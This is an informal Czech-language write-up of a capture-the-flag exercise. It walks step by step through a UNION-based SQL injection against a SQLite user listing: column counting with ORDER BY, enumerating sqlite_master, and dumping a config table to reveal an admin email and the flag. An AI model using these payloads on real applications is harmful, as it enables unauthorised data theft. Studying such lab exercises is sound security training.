prvně jsem tam napsal ', což mi hodilo chybu :D
když jsem to zjistil, tak jsem použil ' ORDER BY 1 -- to mi ukázalo:
Uživatel: Administrator | Pozice: Boss
Uživatel: Jan Novák | Pozice: Student
Uživatel: Petr Svoboda | Pozice: Učitel
zkusil jsem ' ORDER BY 2 -- 
to mi vypsalo to samé
pak jsem zkusil ' ORDER BY 3 --
což mi dalo SQL Chyba: 1st ORDER BY term out of range - should be between 1 and 2
po tom jsem teda zjistil že tam jsou 2 sloupce
tak jsem dal ' UNION SELECT 1,2 -- 
a to mi vypsalo:
Uživatel: 1 | Pozice: 2
Uživatel: Administrator | Pozice: Boss
Uživatel: Jan Novák | Pozice: Student
Uživatel: Petr Svoboda | Pozice: Učitel
pak jsem napsal:
' UNION SELECT name, sql FROM sqlite_master -- 
to mi napsalo:
Uživatel: Administrator | Pozice: Boss
Uživatel: Jan Novák | Pozice: Student
Uživatel: Petr Svoboda | Pozice: Učitel
Uživatel: config | Pozice: CREATE TABLE config (key TEXT, value TEXT)
Uživatel: users | Pozice: CREATE TABLE users (id INTEGER, name TEXT, role TEXT)
takže vím že tabulky jsou key a value
takže jsem tam vložil ' UNION SELECT key, value FROM config -- 
napsalo to:
Uživatel: Administrator | Pozice: Boss
Uživatel: Jan Novák | Pozice: Student
Uživatel: Petr Svoboda | Pozice: Učitel
Uživatel: admin_email | Pozice: admin@skola.cz
Uživatel: flag | Pozice: FLAG{Sql_Un1on_M4st3r_S0SE}  <---- TADY JSEM ZÍSKAL TU VLAJKU :)
